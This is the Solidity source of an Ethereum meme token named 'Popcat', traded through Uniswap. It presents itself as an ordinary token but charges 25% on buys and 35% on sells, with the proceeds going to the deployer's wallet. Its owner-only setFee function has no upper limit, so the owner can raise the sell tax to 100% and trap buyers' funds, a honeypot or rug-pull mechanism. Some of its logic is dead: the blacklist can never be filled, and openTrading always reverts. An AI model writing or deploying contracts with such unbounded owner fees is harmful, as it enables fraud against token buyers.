1 /*
2   TWITTER: https://twitter.com/popcaterc
3   TELEGRAM: https://t.me/popcaterc
4 */
5 
6 
7 
8 // SPDX-License-Identifier: MIT
9 pragma solidity 0.8.17;
10 
11 abstract contract Context {
12     function _msgSender() internal view virtual returns (address) {
13         return msg.sender;
14     }
15 }
16 
17 interface IERC20 {
18     function totalSupply() external view returns (uint256);
19     function balanceOf(address account) external view returns (uint256);
20     function transfer(address recipient, uint256 amount) external returns (bool);
21     function allowance(address owner, address spender) external view returns (uint256);
22     function approve(address spender, uint256 amount) external returns (bool);
23     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
24     event Transfer(address indexed from, address indexed to, uint256 value);
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 }
27 
28 library SafeMath {
29     function add(uint256 a, uint256 b) internal pure returns (uint256) {
30         uint256 c = a + b;
31         require(c >= a, "SafeMath: addition overflow");
32         return c;
33     }
34 
35     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
36         return sub(a, b, "SafeMath: subtraction overflow");
37     }
38 
39     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
40         require(b <= a, errorMessage);
41         uint256 c = a - b;
42         return c;
43     }
44 
45     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
46         if (a == 0) {
47             return 0;
48         }
49         uint256 c = a * b;
50         require(c / a == b, "SafeMath: multiplication overflow");
51         return c;
52     }
53 
54     function div(uint256 a, uint256 b) internal pure returns (uint256) {
55         return div(a, b, "SafeMath: division by zero");
56     }
57 
58     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
59         require(b > 0, errorMessage);
60         uint256 c = a / b;
61         return c;
62     }
63 
64 }
65 
66 contract Ownable is Context {
67     address private _owner;
68     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
69 
70     constructor () {
71         address msgSender = _msgSender();
72         _owner = msgSender;
73         emit OwnershipTransferred(address(0), msgSender);
74     }
75 
76     function owner() public view returns (address) {
77         return _owner;
78     }
79 
80     modifier onlyOwner() {
81         require(_owner == _msgSender(), "Ownable: caller is not the owner");
82         _;
83     }
84 
85     function renounceOwnership() public virtual onlyOwner {
86         emit OwnershipTransferred(_owner, address(0));
87         _owner = address(0);
88     }
89 
90 }
91 
92 interface IUniswapV2Factory {
93     function createPair(address tokenA, address tokenB) external returns (address pair);
94 }
95 
96 interface IUniswapV2Router02 {
97     function swapExactTokensForETHSupportingFeeOnTransferTokens(
98         uint amountIn,
99         uint amountOutMin,
100         address[] calldata path,
101         address to,
102         uint deadline
103     ) external;
104     function factory() external pure returns (address);
105     function WETH() external pure returns (address);
106 }
107 
108 contract popcat is Context , IERC20, Ownable {
109     using SafeMath for uint256;
110 
111     mapping (address => uint256) private _balances;
112     mapping (address => mapping (address => uint256)) private _allowances;
113     mapping (address => bool) private _isExcludedFromFee;
114     mapping (address => bool) private bots;
115     address payable private _taxwallet;
116     uint8 private constant _decimals = 9;
117 
118     string private constant _name = "Popcat";
119     string private constant _symbol = "POPCAT";
120 
121     uint256 private _buyTax = 25;
122     uint256 private _sellTax = 35;
123 
124     uint256 private constant _tTotal = 420_690_000_000_000 * 10**_decimals;
125     uint256 public _maxTxAmount = 2 * (_tTotal/100);
126     uint256 public _maxWalletSize = 2 * (_tTotal/100);
127     uint256 public _taxSwapThreshold = 1 * (_tTotal/1000);
128 
129     IUniswapV2Router02 public uniswapV2Router;
130     address public uniswapV2Pair;
131     bool private tradingOpen = true;
132     bool private inSwap = false;
133     bool private swapEnabled = true;
134 
135     event MaxTxAmountUpdated(uint _maxTxAmount);
136     modifier lockTheSwap {
137         inSwap = true;
138         _;
139         inSwap = false;
140     }
141 
142     constructor () {
143         _balances[_msgSender()] = _tTotal;
144 
145         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
146         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
147         
148         _taxwallet = payable(_msgSender());
149         _isExcludedFromFee[owner()] = true;
150         _isExcludedFromFee[address(this)] = true;
151         _isExcludedFromFee[_taxwallet] = true;
152 
153         emit Transfer(address(0), _msgSender(), _tTotal);
154     }
155 
156     function name() public pure returns (string memory) {
157         return _name;
158     }
159 
160     function symbol() public pure returns (string memory) {
161         return _symbol;
162     }
163 
164     function decimals() public pure returns (uint8) {
165         return _decimals;
166     }
167 
168     function totalSupply() public pure override returns (uint256) {
169         return _tTotal;
170     }
171 
172     function balanceOf(address account) public view override returns (uint256) {
173         return _balances[account];
174     }
175 
176     function transfer(address recipient, uint256 amount) public override returns (bool) {
177         _transfer(_msgSender(), recipient, amount);
178         return true;
179     }
180 
181     function allowance(address owner, address spender) public view override returns (uint256) {
182         return _allowances[owner][spender];
183     }
184 
185     function approve(address spender, uint256 amount) public override returns (bool) {
186         _approve(_msgSender(), spender, amount);
187         return true;
188     }
189 
190     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
191         _transfer(sender, recipient, amount);
192         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
193         return true;
194     }
195 
196     function _approve(address owner, address spender, uint256 amount) private {
197         require(owner != address(0), "ERC20: approve from the zero address");
198         require(spender != address(0), "ERC20: approve to the zero address");
199         _allowances[owner][spender] = amount;
200         emit Approval(owner, spender, amount);
201     }
202 
203     function _transfer(address from, address to, uint256 amount) private {
204         require(from != address(0), "ERC20: transfer from the zero address");
205         require(to != address(0), "ERC20: transfer to the zero address");
206         require(amount > 0, "Transfer amount must be greater than zero");
207         uint256 taxAmount=0;
208         if (from != owner() && to != owner()) {
209             require(tradingOpen == true, "ERC20: This account cannot send tokens until trading is enabled");
210             require(!bots[from] && !bots[to], "ERC20: Wallet is blacklist!");
211             taxAmount = amount.mul(_buyTax).div(100);
212 
213             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
214                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
215                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
216             }
217 
218             if(to == uniswapV2Pair && from!= address(this) ){
219                 taxAmount = amount.mul(_sellTax).div(100);
220             }
221 
222             uint256 contractTokenBalance = balanceOf(address(this));
223             if(contractTokenBalance >= _maxTxAmount) {
224                 contractTokenBalance = _maxTxAmount;
225             }
226             if (!inSwap && to  == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold) {
227                 swapTokensForEth(contractTokenBalance);
228                 uint256 contractETHBalance = address(this).balance;
229                 if(contractETHBalance > 0) {
230                     sendETHToFee(address(this).balance);
231                 }
232             }
233         }
234 
235         if(taxAmount>0){
236           _balances[address(this)]=_balances[address(this)].add(taxAmount);
237           emit Transfer(from, address(this),taxAmount);
238         }
239         _balances[from]=_balances[from].sub(amount);
240         _balances[to]=_balances[to].add(amount.sub(taxAmount));
241         emit Transfer(from, to, amount.sub(taxAmount));
242     }
243 
244     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
245         address[] memory path = new address[](2);
246         path[0] = address(this);
247         path[1] = uniswapV2Router.WETH();
248         _approve(address(this), address(uniswapV2Router), tokenAmount);
249         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
250             tokenAmount,
251             0,
252             path,
253             address(this),
254             block.timestamp
255         );
256     }
257 
258     function removeLimits() external onlyOwner {
259         _maxTxAmount = _tTotal;
260         _maxWalletSize=_tTotal;
261         emit MaxTxAmountUpdated(_tTotal);
262     }
263 
264     function sendETHToFee(uint256 amount) private {
265         _taxwallet.transfer(amount);
266     }
267 
268     function openTrading() external onlyOwner {
269         require(tradingOpen == false, "Trading is enabled!");
270         tradingOpen = true;
271     }
272     
273     function setFee(uint256 _buy, uint256 _sell ) external onlyOwner {
274       _buyTax = _buy;
275       _sellTax = _sell;
276     }
277 
278     receive() external payable {}
279 
280     function manualSwap() external {
281         require(_msgSender()==_taxwallet);
282         uint256 tokenBalance=balanceOf(address(this));
283         if(tokenBalance>0){
284           swapTokensForEth(tokenBalance);
285         }
286         uint256 ethBalance=address(this).balance;
287         if(ethBalance>0){
288           sendETHToFee(ethBalance);
289         }
290     }
291 }